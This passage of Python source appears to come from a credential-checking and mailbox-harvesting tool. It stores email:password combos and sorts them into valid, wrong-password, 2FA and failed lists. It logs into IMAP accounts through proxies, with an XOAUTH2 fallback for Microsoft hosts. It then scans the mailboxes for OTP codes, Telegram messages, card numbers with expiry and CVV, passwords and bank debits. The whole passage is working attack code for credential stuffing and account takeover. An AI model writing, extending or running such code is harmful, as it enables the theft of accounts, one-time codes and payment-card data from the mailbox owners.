# level. A 3 second TTL removes that I/O without hiding a change a user can
# perceive; every writer clears the memo explicitly.
#
# BOTH caches carry `owner` because they are process values: user A's run would
# otherwise populate a slot user B then read or evict.
_FP_TTL = 3.0
_FP_MEMO = {"owner": None, "t": -1e9, "fp": None}
_VALID_CACHE = {"owner": None, "fp": None, "options": None}


def _own(path) -> bool:
    """True when `path` may be SHOWN to the unlocked user (bare files count)."""
    base = os.path.basename(path)
    if not _HASH_RX.match(base):
        return True
    return base.startswith(user_file(""))


def _own_strict(path) -> bool:
    """True only when `path` carries THIS user's own prefix - safe to rewrite."""
    base = os.path.basename(path)
    if not _HASH_RX.match(base):
        return False
    return base.startswith(user_file(""))


def _combo_of(raw_line: str) -> str:
    """email:password part of a stored line. ' | ' (spaces) is authoritative; a
    bare '|' only separates when what follows looks like metadata, so a password
    containing '|' survives instead of being truncated."""
    raw_line = (raw_line or "").strip().strip('"\'')
    if " | " in raw_line:
        return raw_line.split(" | ", 1)[0].strip()
    if "|" in raw_line:
        head, tail = raw_line.split("|", 1)
        t = tail.strip().lower()
        if " " in tail or t.startswith(_META_TAGS):
            return head.strip()
    return raw_line


def _valid_files() -> List[str]:
    files = []
    for pat in _VALID_FILE_PATTERNS:
        files.extend(glob.glob(pat, recursive=True))
    out = []
    for p in dict.fromkeys(files):
        if not os.path.isfile(p):
            continue
        if not _own(p):
            continue
        low = os.path.basename(p).lower()
        if any(kw in low for kw in _VALID_IGNORE) or low == os.path.basename(LAST_ACCOUNT_FILE):
            continue
        out.append(p)
    return out


def _fp_owner_reset() -> None:
    owner = _ui_owner()
    if _FP_MEMO["owner"] != owner:
        _FP_MEMO["owner"] = owner
        _FP_MEMO["fp"] = None
        _FP_MEMO["t"] = -1e9
    if _VALID_CACHE["owner"] != owner:
        _VALID_CACHE["owner"] = owner
        _VALID_CACHE["fp"] = None
        _VALID_CACHE["options"] = None


def _valid_fingerprint():
    """(path, mtime, size) for every candidate file - memoised for _FP_TTL."""
    _fp_owner_reset()
    now = time.monotonic()
    if _FP_MEMO["fp"] is not None and (now - _FP_MEMO["t"]) < _FP_TTL:
        return _FP_MEMO["fp"]
    fp = []
    for p in _valid_files():
        try:
            fp.append((p, os.path.getmtime(p), os.path.getsize(p)))
        except Exception:
            continue
    fp = tuple(sorted(fp))
    _FP_MEMO["fp"] = fp
    _FP_MEMO["t"] = now
    return fp


def _fp_invalidate():
    _FP_MEMO["fp"] = None
    _FP_MEMO["t"] = -1e9


def load_valid():
    """Instant loader: scans only valid text result files, cached on the
    fingerprint until one of those files changes."""
    fp = _valid_fingerprint()
    if _VALID_CACHE["fp"] == fp and _VALID_CACHE["options"] is not None:
        return list(_VALID_CACHE["options"])

    valid_map = {}
    for path in _valid_files():
        try:
            file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    clean_combo = _combo_of(line)
                    if ":" not in clean_combo:
                        continue
                    parts = clean_combo.split(":", 1)
                    email_part = parts[0].strip().lower()
                    pwd_part = parts[1].strip()
                    if "@" not in email_part or "." not in email_part or not pwd_part:
                        continue
                    combo_str = f"{email_part}:{pwd_part}"
                    if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
                        valid_map[email_part] = (file_mtime, combo_str)
        except Exception:
            continue

    sorted_items = sorted(valid_map.values(), key=lambda x: x[0], reverse=True)
    options = []
    for file_mtime, combo_str in sorted_items:
        time_label = f"# Found: {file_mtime.strftime('%Y-%m-%d %H:%M:%S')}"
        options.append(time_label)
        options.append(combo_str)

    options = options if options else ["none"]
    _VALID_CACHE["fp"] = fp
    _VALID_CACHE["options"] = options
    return list(options)


def valid_combos(valid_list) -> List[str]:
    """Real email:password rows only - no 'none' sentinel, no '# Found:' labels."""
    return [v for v in (valid_list or []) if v and v != "none" and not v.startswith("# Found:")]


def merge_into_clean_valid(new_combo_lines: List[str]) -> int:
    """MERGE into the per-user clean-valid file, deduped by email.
    Returns the number of unique accounts now stored."""
    merged = {}
    target = CLEAN_VALID_FILE
    try:
        if os.path.exists(target):
            with open(target, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    em = _combo_of(line).split(":")[0].strip().lower()
                    if "@" in em:
                        merged[em] = line
    except Exception:
        pass
    for line in new_combo_lines:
        em = _combo_of(line).split(":")[0].strip().lower()
        if "@" in em:
            merged[em] = line
    tmp = target + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            f.write("# email:password  (merged by the reader, newest wins)\n")
            for em in sorted(merged):
                f.write(merged[em] + "\n")
        os.replace(tmp, target)
    except Exception:
        pass
    _VALID_CACHE["fp"] = None
    _fp_invalidate()
    return len(merged)


def delete_specific_account_from_storage(target_combo: str):
    """_own_strict - a bare file belongs to every user, so this only rewrites
    files that carry THIS user's own prefix."""
    search_files = glob.glob(os.path.join(_RES_DIR, "*.txt")) + glob.glob("*.txt")
    for path in search_files:
        if not _own_strict(path):
            continue
        filename_lower = os.path.basename(path).lower()
        if filename_lower == os.path.basename(LAST_ACCOUNT_FILE) or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            target_low = (target_combo or "").strip().lower()
            new_lines, removed_here = [], 0
            for line in lines:
                raw_line = line.strip()
                combo = _combo_of(raw_line)
                if combo.lower() == target_low:
                    removed_here += 1
                    continue
                new_lines.append(line)
            if removed_here == 0:
                continue
            tmp = path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
            os.replace(tmp, path)
        except Exception:
            pass
    if load_last_account() == target_combo:
        if os.path.exists(LAST_ACCOUNT_FILE):
            try:
                os.remove(LAST_ACCOUNT_FILE)
            except Exception:
                pass
    _VALID_CACHE["fp"] = None
    _fp_invalidate()


def clear_all_valid_accounts_storage():
    """_own_strict - see delete_specific_account_from_storage()."""
    search_files = glob.glob(os.path.join(_RES_DIR, "*.txt")) + glob.glob("*.txt")
    for path in search_files:
        if not _own_strict(path):
            continue
        filename_lower = os.path.basename(path).lower()
        if "valid" not in filename_lower and "clean" not in filename_lower:
            continue
        # clean_proxies.txt matched 'clean' and got truncated to 0 bytes.
        if any(kw in filename_lower for kw in ("prox", "config", "blocklist", "resume", "unfinished", "remaining", "input")):
            continue
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("")
        except Exception:
            pass
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            os.remove(LAST_ACCOUNT_FILE)
        except Exception:
            pass
    _VALID_CACHE["fp"] = None
    _fp_invalidate()
# @@END 019 VALID_STORAGE


# @@BLOCK 020 ZIP_CACHE deps=019
_ZIP_CACHE = {"owner": None, "fp": None, "blob": None}


def generate_all_mail_zip():
    """Cached on the same (path, mtime) fingerprint as load_valid().
    Per-user - only this user's result files are packed, and the cache slot is
    reset when a different user's run reaches it."""
    owner = _ui_owner()
    if _ZIP_CACHE["owner"] != owner:
        _ZIP_CACHE["owner"] = owner
        _ZIP_CACHE["fp"] = None
        _ZIP_CACHE["blob"] = None

    _paths = [p for p in (glob.glob(os.path.join(_RES_DIR, "*.txt")) + glob.glob("*.txt"))
              if _own(p)]
    fp = _valid_fingerprint() + tuple(sorted(
        (p, os.path.getmtime(p)) for p in _paths if os.path.isfile(p)))
    if _ZIP_CACHE["fp"] == fp and _ZIP_CACHE["blob"] is not None:
        return _ZIP_CACHE["blob"]

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        added_files = set()
        added_arcnames = set()

        for path in _paths:
            filename = os.path.basename(path)
            filename_lower = filename.lower()
            if filename in added_files or filename == os.path.basename(LAST_ACCOUNT_FILE) or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining"]):
                continue
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    clean_lines = []
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        if ":" in line:
                            combo = _combo_of(line)
                            if ":" in combo:
                                clean_lines.append(combo)

                count = len(clean_lines)
                if count == 0:
                    continue

                if "valid" in filename_lower or "clean" in filename_lower:
                    cat_name = f"Clean_Valid_{count}.txt"
                elif "app" in filename_lower or "2fa" in filename_lower or "otp" in filename_lower:
                    cat_name = f"App_Password_2FA_{count}.txt"
                elif "wrong" in filename_lower or "pass" in filename_lower:
                    cat_name = f"Wrong_Password_{count}.txt"
                elif "fail" in filename_lower or "conn" in filename_lower:
                    cat_name = f"Connection_Failed_{count}.txt"
                else:
                    base_wo_ext = os.path.splitext(filename)[0]
                    cat_name = f"{base_wo_ext}_{count}.txt"

                # Two source files can map to the SAME category+count (e.g. two
                # different valid_*.txt with 13 rows each). Suffix until unique
                # so ZipFile stops warning about a duplicate name.
                if cat_name in added_arcnames:
                    stem, ext = os.path.splitext(cat_name)
                    n = 2
                    while f"{stem}_{n}{ext}" in added_arcnames:
                        n += 1
                    cat_name = f"{stem}_{n}{ext}"
                added_arcnames.add(cat_name)

                file_content = "\n".join(clean_lines)
                zf.writestr(cat_name, file_content)
                added_files.add(filename)
            except Exception:
                continue
    blob = buf.getvalue()
    _ZIP_CACHE["fp"] = fp
    _ZIP_CACHE["blob"] = blob
    return blob
# @@END 020 ZIP_CACHE


# @@BLOCK 021 MIME_AND_PORTAL deps=019
def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")

def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me",
        "montevideo.com.uy": "https://webmail.montevideo.com.uy",
    }
    return portals.get(domain, f"https://www.{domain}")
# @@END 021 MIME_AND_PORTAL


# @@BLOCK 022 IMAP_UTF7 deps=021
_B64_MEMO = {}                                  # v13.37: decode memoisation


def decode_imap_utf7(s: str) -> str:
    """IMAP-UTF7 (RFC 3501 §5.1.3) -> str.

    v13.40: the old split("&") walk turned the '&-' literal escape into '-'.
    A folder named 'A & B' decoded to 'A - B', so every later select() hit a
    mailbox that does not exist.  Scan instead of split.
    """
    if "&" not in s:
        return s
    hit = _B64_MEMO.get(s)
    if hit is not None:
        return hit

    res = []
    i, n = 0, len(s)
    while i < n:
        if s[i] != "&":
            res.append(s[i])
            i += 1
            continue
        end = s.find("-", i + 1)
        if end == -1:                       # unterminated shift sequence
            res.append(s[i:])
            break
        run = s[i + 1:end]
        if run == "":
            res.append("&")                 # '&-' is a literal '&'
        else:
            try:
                b64_padded = run.replace(",", "/") + "=" * ((4 - len(run) % 4) % 4)
                res.append(base64.b64decode(b64_padded).decode("utf-16be"))
            except Exception:
                res.append("&" + run + "-")  # keep it visible if it will not decode
        i = end + 1

    out = "".join(res)
    if len(_B64_MEMO) < 4096:
        _B64_MEMO[s] = out
    return out

def encode_imap_utf7(s: str) -> str:
    parts = []
    i = 0
    while i < len(s):
        char = s[i]
        if 0x20 <= ord(char) <= 0x7E:
            if char == '&':
                parts.append('&-')
            else:
                parts.append(char)
            i += 1
        else:
            start = i
            while i < len(s) and not (0x20 <= ord(s[i]) <= 0x7E):
                i += 1
            chunk = s[start:i]
            utf16 = chunk.encode('utf-16be')
            b64 = base64.b64encode(utf16).decode('ascii')
            mod_b64 = b64.replace('/', ',').rstrip('=')
            parts.append(f'&{mod_b64}-')
    return "".join(parts)

def clean_display_label(folder_name: str) -> str:
    upper_name = folder_name.upper()
    if upper_name == "INBOX":
        return "INBOX"
    if upper_name.startswith("INBOX.") or upper_name.startswith("INBOX/"):
        return folder_name[6:]
    return folder_name

def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
    """flags, delimiter, raw mailbox name.

    v13.43: the delimiter default was the two-character string '".' and a line
    carrying only a name (no delimiter field) put that NAME into delim and left
    raw_name empty, so the mailbox was dropped. One part means name, not delim.
    """
    s = s.strip()
    flags, delim, raw_name = "", "/", s
    if s.startswith("("):
        end_paren = s.find(")")
        if end_paren != -1:
            flags = s[1:end_paren].strip()
            remainder = s[end_paren + 1:].strip()
            parts = remainder.split(None, 1)
            if len(parts) == 2:
                delim = parts[0]
                raw_name = parts[1].strip()
            elif len(parts) == 1:
                raw_name = parts[0].strip()
            else:
                raw_name = ""

    if raw_name.startswith('"') and raw_name.endswith('"') and len(raw_name) >= 2:
        raw_name = raw_name[1:-1].replace('\\"', '"')

    return flags, delim, raw_name

def get_imap_path(selected_ui_folder: str) -> str:
    folder_map = st.session_state.get("folder_map", {})
    return folder_map.get(selected_ui_folder, selected_ui_folder)
# @@END 022 IMAP_UTF7


# @@BLOCK 023 FOLDERS deps=022
def list_folders(mail, email_addr: str = "", host_val: str = ""):
    found = set()
    st.session_state.folder_debug_logs = []
    debug_log(f"📧 [TARGET ACCOUNT] Email: '{email_addr}' | Host: '{host_val}'")
    debug_log("🔍 [ENGINE START] Issuing IMAP command: LIST '' '*'")

    try:
        typ, data = mail.list('""', "*")
        debug_log(f"📡 [RESPONSE STATUS] Server Response Code: '{typ}' | Raw Records Count: {len(data) if data else 0}")
        if typ == "OK" and data:
            for idx, item in enumerate(data, 1):
                if not item:
                    continue
                try:
                    s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                    s = s.strip()
                    debug_log(f"\n  ├─ [Line #{idx} Raw]: {s}")
                    flags, delim, clean_name = parse_imap_list_line(s)
                    flags_lower = flags.lower()

                    if r"\noselect" in flags_lower or r"\nonexistent" in flags_lower:
                        debug_log("  │   └─ ⚠️ FILTERED OUT: Flagged as \\Noselect or \\Nonexistent")
                        continue

                    if clean_name and clean_name not in (".", "/", '""', "''"):
                        decoded_folder = decode_imap_utf7(clean_name)
                        ui_label = clean_display_label(decoded_folder)
                        found.add(decoded_folder)
                        debug_log(f"  │   └─ ✅ ACCEPTED FOLDER: Raw='{decoded_folder}' -> UI='{ui_label}'")
                except Exception as line_ex:
                    debug_log(f"  │   └─ ⚠️ PARSE ERROR: {line_ex}")
                    continue
    except Exception as ex:
        debug_log(f"❌ [EXCEPTION ERROR] Folder enumeration failed: {ex}")

    if not found:
        found.add("INBOX")

    sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
    folder_map, display_folders, used = {}, [], set()
    for raw_f in sorted_raw:
        label = clean_display_label(raw_f)
        if label in used:
            # v13.40: 'INBOX.Sent' and 'Sent' both clean to 'Sent'; without a
            # suffix the second one silently replaced the first in folder_map.
            base = label
            n = 2
            while label in used:
                label = f"{base} ({n})"
                n += 1
            debug_log(f"  │   └─ ⚠️ DUPLICATE LABEL '{base}' -> renamed '{label}' (raw '{raw_f}')")
        used.add(label)
        folder_map[label] = raw_f
        display_folders.append(label)

    st.session_state.folder_map = folder_map
    save_session_cache()
    return display_folders
# @@END 023 FOLDERS


# @@BLOCK 024 LOGIN deps=023
def connect_and_login(host, port, timeout, proxy_str, users, password, email_addr):
    """Log in on ONE host.  Microsoft hosts go over XOAUTH2 first.

    v13.37: a definitive Microsoft answer (MsTokenRejected.verdict) is no longer
    thrown away.  It raises MsVerdict("WRONG"|"APPASS") so the caller stops
    host-hopping and reports the truth instead of falling through to basic auth
    and labelling a known-wrong password as APPASS.

    Returns an OPEN logged-in mailbox, or raises the last error.
    """
    if _MS_OAUTH_OK and (host or "").lower() in _MS_IMAP_HOSTS:
        try:
            mail, _exists, _claims = _ms_oauth.imap_xoauth2_open(
                email_addr, password, host, _XOAUTH2IMAP4SSL,
                port=port, proxy_str=proxy_str,
                insecure=not _cfg_verify(), attempt_timeout=timeout)
            return mail
        except _ms_oauth.MsTokenTransport:
            pass                              # network blip -> fall through to basic auth
        except _ms_oauth.MsTokenRejected as trej:      # v13.37
            _verdict = getattr(trej, "verdict", "")
            _code = getattr(trej, "code", "?")
            if _verdict == "wrong_password":
                raise MsVerdict("WRONG", f"XOAUTH2 {_code} -> wrong password")
            if _verdict == "need_app_password":
                raise MsVerdict("APPASS", f"XOAUTH2 {_code} -> MFA, app password required")
            # unknown verdict -> fall through to basic auth
        except MsVerdict:
            raise
        except Exception:
            pass

    last_err = None
    for user in users:
        mail = None
        try:
            mail = open_imap(host, port, timeout, proxy_str=proxy_str)
            mail.login(user, password)
            return mail
        except Exception as ex:
            last_err = ex
            if mail:
                try:
                    mail.logout()
                except Exception:
                    pass
            s = str(ex).lower()
            if not _looks_like_auth_error(s) and not _looks_like_app_password_error(s):
                break                          # host-level failure: user is irrelevant
    raise last_err or RuntimeError(f"login failed for {email_addr}")

def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None, port=None):
    """Connect + login.  Tries the full address first, then the bare local part,
    because legacy ISP servers authenticate on the local part only.  Microsoft
    hosts are handled over XOAUTH2 inside connect_and_login().

    v13.43: `port` is a real parameter, so the proxy probe is handed the port
    that is about to be dialled instead of re-reading the config and probing a
    different one than the socket then uses.
    """
    if timeout is None:
        timeout = st.session_state.app_config.get("connection_timeout", 15)
    port_val = int(port or st.session_state.app_config.get("imap_port", 993) or 993)
    if proxy_str is None:
        proxy_str = _reader_proxy_str(host_val, port_val)

    # v13.40: try_alt_username was honoured only in the batch path.
    if st.session_state.app_config.get("try_alt_username", True):
        users = username_candidates(email_addr)
    else:
        users = [email_addr]
    return connect_and_login(host_val, port_val, timeout, proxy_str,
                             users, password_val, email_addr)

def resolve_active_host(email_addr: str) -> str:
    """Single source of truth for 'which host is this session bound to'."""
    ov = st.session_state.get("custom_host", "").strip()
    if ov:
        return ov
    mh = st.session_state.get("mb_host", "")
    if mh:
        return mh
    cands = candidate_hosts(email_addr) if email_addr else []
    return cands[0] if cands else ""

def get_active_mail(email_addr, password_val, host_val):
    # v13.40: the key was email:password only, so switching the host override or
    # the port silently reused a socket to the OLD server. Bind host+port too.
    _port = st.session_state.app_config.get("imap_port", 993)
    current_combo = f"{email_addr}:{password_val}@{host_val}:{_port}"
    if st.session_state.get("connected_account_combo") != current_combo or not st.session_state.get("active_mail"):
        if st.session_state.active_mail:
            try:
                st.session_state.active_mail.logout()
            except Exception:
                pass
            st.session_state.active_mail = None

        try:
            st.session_state.active_mail = open_mail(email_addr, password_val, host_val, port=_port)
            st.session_state.connected_account_combo = current_combo
            save_session_cache()
        except Exception as ex:
            st.session_state.active_mail = None
            raise ex
    else:
        try:
            st.session_state.active_mail.noop()
        except Exception:
            try:
                st.session_state.active_mail = open_mail(email_addr, password_val, host_val, port=_port)
                st.session_state.connected_account_combo = current_combo
                save_session_cache()
            except Exception as ex:
                st.session_state.active_mail = None
                raise ex

    return st.session_state.active_mail

def move_message(mail, src_folder_label, mid, dst_folder_label):
    """Correct COPY+DELETE: source folder must be selected for COPY to work."""
    src = encode_imap_utf7(get_imap_path(src_folder_label))
    dst = encode_imap_utf7(get_imap_path(dst_folder_label))

    typ, data = mail.select(f'"{src}"', readonly=False)
    if typ != "OK":
        raise RuntimeError(f"Cannot select source folder '{src_folder_label}': {data}")

    typ, data = mail.copy(mid, f'"{dst}"')
    if typ != "OK":
        raise RuntimeError(f"COPY to '{dst_folder_label}' failed: {typ} {data}")

    mail.store(mid, '+FLAGS', '\\Deleted')
    mail.expunge()
# @@END 024 LOGIN


# @@BLOCK 025 CLASSIFY_CONTENT deps=024
_WORD_RE_CACHE = {}


def _has_word(haystack_lower: str, needles) -> bool:
    """Whole-word/phrase match instead of raw substring.

    v13.40: bare `in` made 'outgoing' a Telegram hit ('tg'), 'shipping' an OTP
    hit ('pin') and 'decode' an OTP hit ('code').
    """
    for needle in needles:
        key = needle
        rx = _WORD_RE_CACHE.get(key)
        if rx is None:
            rx = re.compile(r"(?<![a-z0-9])" + re.escape(needle) + r"(?![a-z0-9])")
            if len(_WORD_RE_CACHE) < 512:
                _WORD_RE_CACHE[key] = rx
        if rx.search(haystack_lower):
            return True
    return False


def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
    extortion_keywords = [
        "bitcoin wallet", "transfer me", "deactivate and remove all malware",
        "posted to the public", "recorded all your actions", "trojan",
        "remote control function", "my servers", "pay bitcoin", "ransom"
    ]
    combined = f"{subject} {body} {frm}".lower()
    return _has_word(combined, extortion_keywords)

def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
    if is_extortion_spam(subject, body, frm):
        return []

    categories = []
    combined = f"{subject} {body} {frm}".lower()
    pins = pins or []
    cards = cards or []
    creds = creds or []

    otp_kws = ["otp", "verification", "verify", "verification code", "auth code", "confirm code", "pin", "security code", "code", "confirmation code"]
    if pins or _has_word(combined, otp_kws):
        categories.append("🔑 OTP / CODE")

    tg_kws = ["telegram", "t.me", "tg", "telegram code", "telegram notification", "telegram alert"]
    if _has_word(combined, tg_kws):
        categories.append("📱 TELEGRAM")

    bl_kws = ["blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist"]
    if _has_word(combined, bl_kws):
        categories.append("🚫 BLACKLIST / BAN")

    card_kws = ["cvv", "exp date", "debit", "bank debit", "online purchase", "card ending", "debited by", "debit alert"]
    if cards or _has_word(combined, card_kws):
        categories.append("💳 CARD / DEBIT")

    gen_bot_kws = ["password reset", "security alert", "mcafee", "credential", "application password", "tracking number", "purchase order", "po #"]
    if creds or (not categories and _has_word(combined, gen_bot_kws)):
        categories.append("🤖 BOT MSG")

    return categories

def extract_pins_and_links(text):
    pins = []
    for m in re.finditer(r'(?i)(code|otp|pin|passcode|verification|verify)[^\d]{0,12}(\d{4,8})', text or ""):
        num = m.group(2)
        if num.startswith(("19", "20")) and len(num) == 4:
            continue
        if num in {"0000", "1234", "1111"}:
            continue
        pins.append(num)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text or "")
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))

def _luhn_ok(number: str) -> bool:
    """v13.40: any 16 digits passed as a card. Luhn rejects order IDs."""
    digits = [int(c) for c in number if c.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    total, alt = 0, False
    for d in reversed(digits):
        if alt:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        alt = not alt
    return total % 10 == 0


def extract_credentials_and_cards(text):
    card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
    cards = re.findall(card_pattern, text)
    cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]
    cleaned_cards = [c for c in cleaned_cards if _luhn_ok(c)]

    card_exp = re.findall(r'(?i)(?:exp(?:iry|iration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
    card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)

    formatted_cards = []
    for c in cleaned_cards:
        detail = f"Card: {c}"
        if card_exp:
            detail += f" | EXP: {card_exp[0]}"
        if card_cvv:
            detail += f" | CVV: {card_cvv[0]}"
        formatted_cards.append(detail)

    cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card)\s*[:=]\s*(\S+)', text)

    debit_sources = []
    bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited)\s*[:=]?\s*([^\n\r,.]+)', text)
    if bank_debits:
        debit_sources.append(f"Bank Debit: {bank_debits[0].strip()}")

    online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at)\s*[:=]?\s*([^\n\r,.]+)', text)
    if online_debits:
        debit_sources.append(f"Online Purchase Debit: {online_debits[0].strip()}")

    card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card)\s*[:=]?\s*([^\n\r,.]+)', text)
    if card_debits:
        debit_sources.append(f"Card Debit Source: {card_debits[0].strip()}")

    orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if orders:
        debit_sources.append(f"Order/PO Ref: {orders[0].strip()}")

    trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if trackings:
        debit_sources.append(f"Tracking #: {trackings[0].strip()}")

    formatted_cards.extend(debit_sources)

    return list(dict.fromkeys(formatted_cards)), list(dict.fromkeys(cred_patterns))

def clean_boilerplate(text):
    if not text:
        return ""
    patterns = [
        (r"unsubscribe.*?(?:\n|$)", re.IGNORECASE),
        (r"privacy policy.*?(?:\n|$)", re.IGNORECASE),
        (r"confidentiality notice.*?(?:\n\n|$)", re.IGNORECASE),
        (r"this email was sent by.*?(?:\n|$)", re.IGNORECASE)
    ]
    cleaned = text
    for pat, flags in patterns:
        cleaned = re.sub(pat, "", cleaned, flags=flags)
    return cleaned.strip()

def should_blacklist_message(msg, blacklist_input) -> bool:
    if not blacklist_input:
        return False
    blackwords = [w.strip().lower() for w in blacklist_input.split(",") if w.strip()]
    if not blackwords:
        return False
    combined_text = f"{msg.get('subject', '')} {msg.get('body', '')} {msg.get('from', '')}".lower()
    return _has_word(combined_text, blackwords)
# @@END 025 CLASSIFY_CONTENT


# @@BLOCK 026 SEARCH_AND_FETCH deps=025
def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
    # only quotes were escaped; ( ) { } \ broke the command outright.
    clean_q = re.sub(r'([\\(){}"\[\]])', r'\\\1', query_term).strip()
    f_cmd = field_cmd.upper()

    for strat_name, search_params in [
        ("Native Raw Unquoted", f'{f_cmd} {clean_q}'),
        ("Native Raw Quoted", f'{f_cmd} "{clean_q}"'),
        ("CHARSET UTF-8 Raw", f'CHARSET UTF-8 {f_cmd} "{clean_q}"'),
    ]:
        log_func(f"  ├─ [SEARCH STRATEGY] Trying: mail.search(None, {repr(search_params)})")
        try:
            typ, data = mail.search(None, search_params)
            if typ == "OK" and data:
                log_func(f"  │   └─ ✅ {strat_name} Successful! Response: {data}")
                return typ, data
        except Exception as ex:
            log_func(f"  │   └─ ⚠️ {strat_name} Failed: {ex}")

    log_func(f"  ├─ [SEARCH STRATEGY 4 - BATCHED SCAN ({f_cmd})] Server native search rejected. Running chunked scan...")
    try:
        typ, data = mail.search(None, "ALL")
        if typ == "OK" and data and data[0]:
            all_ids = (data[0] or b"").split()
            if not all_ids:
                return "OK_FALLBACK", [b""]

            log_func(f"  │   └─ 🔍 Batch scanning {len(all_ids)} messages for query '{query_term}' in field '{f_cmd}'...")
            matched_ids = []
            q_lower = query_term.lower()

            # TEXT asked for BODY.PEEK[] - the whole message, headers,
            # attachments and all - for every chunk. BODY.PEEK[TEXT] is the part
            # the match is actually run against, and a fraction of the size.
            if f_cmd == "SUBJECT":
                fetch_query = "(BODY.PEEK[HEADER.FIELDS (SUBJECT)])"
            elif f_cmd == "FROM":
                fetch_query = "(BODY.PEEK[HEADER.FIELDS (FROM)])"
            else:
                fetch_query = "(BODY.PEEK[TEXT])"

            # 100 -> 250. The whole folder is walked either way; the chunk size
            # only changes the number of round trips.
            chunk_size = 250
            for i in range(0, len(all_ids), chunk_size):
                chunk_ids = all_ids[i:i + chunk_size]
                id_range_bytes = b",".join(chunk_ids)

                try:
                    _, fetch_datas = mail.fetch(id_range_bytes, fetch_query)
                    if fetch_datas:
                        for item in fetch_datas:
                            if isinstance(item, tuple) and len(item) >= 2:
                                header_str = item[0].decode("utf-8", errors="ignore")
                                content_bytes = item[1].decode("utf-8", errors="ignore")
                                if _has_word(content_bytes.lower(), [q_lower]):
                                    mid_match = re.search(r'^(\d+)', header_str.strip())
                                    if mid_match:
                                        matched_ids.append(mid_match.group(1).encode('utf-8'))
                except Exception as chunk_ex:
                    log_func(f"  │   └─ ⚠️ Chunk fetch exception: {chunk_ex}")
                    continue

            log_func(f"  │   └─ ✅ Batched Scan Complete! Found {len(matched_ids)} matching message IDs out of {len(all_ids)}.")
            return "OK_FALLBACK", [b" ".join(matched_ids)] if matched_ids else [b""]
    except Exception as ex4:
        log_func(f"  │   └─ ❌ Batched Scan Exception: {ex4}")

    return "NO", [b""]

def html_to_text(raw_html: str) -> str:
    """Minimal, dependency-free HTML -> text for HTML-only mail."""
    if not raw_html:
        return ""
    s = re.sub(r"(?is)<(script|style)\b.*?</\1>", " ", raw_html)
    s = re.sub(r"(?i)<br\s*/?>", "\n", s)
    s = re.sub(r"(?i)</(p|div|tr|li|h[1-6])>", "\n", s)
    s = re.sub(r"(?s)<[^>]+>", " ", s)
    s = html.unescape(s)
    s = re.sub(r"[ \t\xa0]+", " ", s)
    s = re.sub(r"\n{3,}", "\n\n", s)
    return s.strip()


def _part_text(part) -> str:
    try:
        payload = part.get_payload(decode=True)
        if not payload:
            return ""
        return payload.decode(part.get_content_charset() or "utf-8", errors="ignore")
    except Exception:
        return ""


